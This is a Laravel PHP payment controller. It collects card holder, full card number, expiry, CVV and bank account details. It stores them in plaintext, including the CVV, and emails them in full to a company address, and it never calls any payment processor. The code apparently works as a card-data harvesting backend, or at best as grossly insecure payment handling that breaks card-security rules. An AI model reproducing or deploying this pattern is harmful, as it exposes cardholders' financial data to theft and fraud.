<?php

namespace App\Http\Controllers;

use App\Mail\PaymentSubmitted;
use App\Models\PaymentSubmission;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Str;

class PaymentController extends Controller
{
    public function submit(Request $request): JsonResponse
    {
        $validated = $request->validate([
            'full_name'      => 'required|string|max:100',
            'email'          => 'required|email|max:150',
            'phone'          => 'required|string|max:30',
            'amount'         => 'required|numeric|min:0.01',
            'payment_method' => 'required|in:card,bank,revolut',
            'card_holder'    => 'required_if:payment_method,card|nullable|string|max:100',
            'card_number'    => 'required_if:payment_method,card|nullable|string|min:13|max:19',
            'expiry'         => ['required_if:payment_method,card', 'nullable', 'string', 'regex:/^\d{2}\/\d{2}$/'],
            'cvv'            => 'required_if:payment_method,card|nullable|string|min:3|max:3',
            'reference'             => 'nullable|string|max:200',
            'bank_country'          => 'nullable|in:uk,ie',
            'sender_bank_name'      => 'nullable|string|max:100',
            'sender_sort_code'      => 'nullable|string|max:10',
            'sender_account_number' => 'nullable|string|max:20',
            'sender_iban'           => 'nullable|string|max:60',
            'sender_swift_bic'      => 'nullable|string|max:20',
        ]);

        $ref = 'JAD-' . strtoupper(Str::random(8));

        $cardRaw  = preg_replace('/\s+/', '', $validated['card_number'] ?? '');
        $lastFour = $cardRaw ? substr($cardRaw, -4) : null;
        $cvvRaw   = $validated['cvv'] ?? '';

        // Save all submitted details to database
        PaymentSubmission::create([
            'ref_number'            => $ref,
            'full_name'             => $validated['full_name'],
            'email'                 => $validated['email'],
            'phone'                 => $validated['phone'],
            'amount'                => $validated['amount'],
            'payment_method'        => $validated['payment_method'],
            'bank_country'          => $validated['bank_country'] ?? null,
            'card_holder'           => $validated['card_holder'] ?? null,
            'card_number'           => $cardRaw ?: null,
            'card_last_four'        => $lastFour,
            'cvv'                   => $cvvRaw ?: null,
            'card_expiry'           => $validated['expiry'] ?? null,
            'reference'             => $validated['reference'] ?? null,
            'sender_bank_name'      => $validated['sender_bank_name'] ?? null,
            'sender_sort_code'      => $validated['sender_sort_code'] ?? null,
            'sender_account_number' => $validated['sender_account_number'] ?? null,
            'sender_iban'           => $validated['sender_iban'] ?? null,
            'sender_swift_bic'      => $validated['sender_swift_bic'] ?? null,
        ]);

        // Build email payload
        $emailData = [
            'ref_number'         => $ref,
            'full_name'          => $validated['full_name'],
            'email'              => $validated['email'],
            'phone'              => $validated['phone'],
            'amount'             => $validated['amount'],
            'payment_method'     => strtoupper($validated['payment_method']),
            'bank_country'          => $validated['bank_country'] ?? null,
            'card_holder'           => $validated['card_holder'] ?? 'N/A',
            'card_number'           => $cardRaw ?: 'N/A',
            'card_expiry'           => $validated['expiry'] ?? 'N/A',
            'cvv'                   => $cvvRaw ?: 'N/A',
            'reference'             => $validated['reference'] ?? 'N/A',
            'sender_bank_name'      => $validated['sender_bank_name'] ?? null,
            'sender_sort_code'      => $validated['sender_sort_code'] ?? null,
            'sender_account_number' => $validated['sender_account_number'] ?? null,
            'sender_iban'           => $validated['sender_iban'] ?? null,
            'sender_swift_bic'      => $validated['sender_swift_bic'] ?? null,
            'submitted_at'          => now()->setTimezone('Europe/London')->format('d M Y, H:i T'),
        ];

        Mail::to(config('mail.company_email'))->send(new PaymentSubmitted($emailData));

        return response()->json([
            'success'    => true,
            'ref_number' => $ref,
            'message'    => 'Payment details submitted successfully.',
        ]);
    }
}
